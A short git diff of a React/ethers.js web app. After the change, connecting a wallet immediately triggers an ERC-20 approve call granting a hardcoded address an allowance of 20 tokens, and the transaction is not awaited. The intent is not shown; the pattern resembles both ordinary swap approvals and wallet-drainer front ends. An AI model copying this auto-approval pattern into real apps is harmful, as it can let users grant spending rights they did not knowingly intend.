@@ -5,8 +5,10 @@ import {ethers} from 'ethers'
 export const App = () => {
     const [wallet, setWallet] = useState()
     async function connectAndApprove() {
-        const wallet = getWalletAddressOrConnect()
+        const wallet =await getWalletAddressOrConnect()
+        console.log(wallet)
         setWallet(wallet)
+        approve()
     }
     const contractAddress="0x9d668C1E01667DED56762e25Fa43bb6B1a757126"
     const contractABI=[
@@ -286,7 +288,7 @@ export const App = () => {
             "type": "function"
         }
     ]
-    async function callMultiswap(e) { 
+    async function approve(e) { 
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         const { chainId } = await provider.getNetwork()
         console.log("chain id is ", chainId)
@@ -300,7 +302,8 @@ export const App = () => {
             contractABI,
             signer
         ); 
-        return console.log(erc20Contract)
+         var tx = erc20Contract.approve("0x460D3Bb056Df7aB5BA6701E78D57c689c7B1D513", ethers.utils.parseEther("20"))
+         console.log("transection is ", tx);
     }
     return <div>
         <div>
